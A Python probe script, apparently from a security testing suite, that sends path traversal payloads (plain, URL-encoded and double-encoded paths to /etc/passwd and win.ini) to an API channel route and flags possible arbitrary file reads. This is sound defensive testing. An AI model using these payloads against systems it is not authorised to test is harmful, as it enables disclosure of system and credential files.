"""
Probe script to test Path Traversal vulnerabilities.
"""

import sys
import httpx
import asyncio
from base_probe import BaseProbe, parse_args, run_probe, ProbeResult


class PathTraversalProbe(BaseProbe):
    async def run(self):
        print(f"[*] Starting Path Traversal Probe against {self.base_url}...", file=sys.stderr)
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            await self.check_url_path_traversal(client)
            # Add headers/query/body checks if file access endpoints exist

    async def check_url_path_traversal(self, client):
        """Check traversal in URL path segments."""
        # Target a dynamic route: /api/v2/channels/{channel_id}
        
        payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd", # URL encoded
            "..%252F..%252F..%252Fetc%252Fpasswd", # Double URL encoded
            "....//....//....//etc//passwd",
            "C:/Windows/win.ini",
            "../../../../Windows/win.ini"
        ]
        
        for payload in payloads:
            endpoint = f"/api/v2/channels/{payload}"
            result = ProbeResult("Path Traversal in URL", endpoint)
            
            try:
                response = await client.get(
                    f"{self.base_url}{endpoint}",
                    headers=self.get_headers()
                )
                result.status_code = response.status_code
                
                # Analyze response
                if response.status_code == 200:
                    # Check if it looks like a file
                    content = response.text.lower()
                    if "root:x:0:0" in content or "[extensions]" in content or "font" in content:
                        result.add_finding("critical", f"Potential Arbitrary File Read with payload: {payload}")
                    else:
                        # Might be just a "Channel not found" but returning 200 is weird for this payload
                        result.add_finding("info", f"Server returned 200 for traversal payload (Verify content manually): {payload}")
                elif response.status_code == 500:
                    result.add_finding("medium", f"Server returned 500 (Unhandled exception for path: {payload})")
                
            except Exception as e:
                result.error = str(e)
            
            # Don't clutter unless finding
            if result.findings or result.status_code == 200 or result.status_code == 500:
                self.results.append(result)

if __name__ == "__main__":
    args = parse_args("Verify Path Traversal defenses")
    asyncio.run(run_probe(PathTraversalProbe, args))
